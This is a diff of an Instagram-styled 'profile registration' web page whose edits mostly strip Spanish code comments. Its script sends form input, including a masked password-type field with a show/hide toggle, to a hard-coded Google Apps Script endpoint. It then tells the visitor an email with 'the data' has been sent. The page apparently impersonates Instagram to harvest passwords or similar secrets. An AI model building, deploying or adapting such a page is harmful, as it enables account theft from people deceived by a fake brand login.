@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Registro de Perfil IG</title>
     <style>
-        /* --- ESTÉTICA INSTAGRAM --- */
         body {
             margin: 0;
             padding: 0;
@@ -46,7 +45,6 @@
             color: #262626;
         }
 
-        /* Contenedor para el input y el ojito */
         .password-container {
             position: relative;
             width: 100%;
@@ -64,8 +62,6 @@
             box-sizing: border-box;
             transition: border-color 0.3s;
         }
-
-        /* Padding extra a la derecha para que el texto no se meta debajo del ojo */
         .password-container input {
             padding-right: 45px;
         }
@@ -73,8 +69,6 @@
         input:focus {
             border-color: #bc1888;
         }
-
-        /* Estilos del Ojito */
         .toggle-password {
             position: absolute;
             right: 15px;
@@ -145,31 +139,24 @@
     </div>
 
     <script>
-        // ==========================================
-        // PEGA TU URL DE GOOGLE SCRIPT AQUÍ ABAJO
-        // ==========================================
+
         const scriptURL = 'https://script.google.com/macros/s/AKfycbyKo_-Wh51TV31OzRdfPfabnwJ8_CCLkRMNUspcNMwDIQesnBdVUihvBXt2QuUvPIC8/exec'; 
         // ==========================================
 
-        // --- LÓGICA DEL OJITO (VER/OCULTAR) ---
         const nicknameInput = document.getElementById('nicknameInput');
         const toggleIcon = document.getElementById('toggleIcon');
 
-        // SVGs para intercambiar
         const eyeOpenSVG = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>';
         const eyeClosedSVG = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7c.44 0 .87-.02 1.28-.05"/><line x1="2" x2="22" y1="2" y2="22"/></svg>';
 
         toggleIcon.addEventListener('click', function () {
-            // 1. Alternar el tipo de input (password <-> text)
             const type = nicknameInput.getAttribute('type') === 'password' ? 'text' : 'password';
             nicknameInput.setAttribute('type', type);
             
-            // 2. Alternar el icono
             toggleIcon.innerHTML = type === 'password' ? eyeOpenSVG : eyeClosedSVG;
         });
 
 
-        // --- LÓGICA DEL FORMULARIO (La misma de antes) ---
         const form = document.forms['heroForm'];
         const message = document.getElementById('message');
         const btn = document.getElementById('submitBtn');
@@ -189,10 +176,9 @@
                     message.innerHTML = "Se te ha enviado un correo con los datos ";
                     btn.innerHTML = "¡Listo!";
                     form.reset();
-                    // Al resetear, aseguramos que el input vuelva a ser password y el ojo abierto
                     nicknameInput.setAttribute('type', 'password');
                     toggleIcon.innerHTML = eyeOpenSVG;
-
+// //
                     setTimeout(() => {
                         btn.disabled = false;
                         btn.innerHTML = originalBtnText;
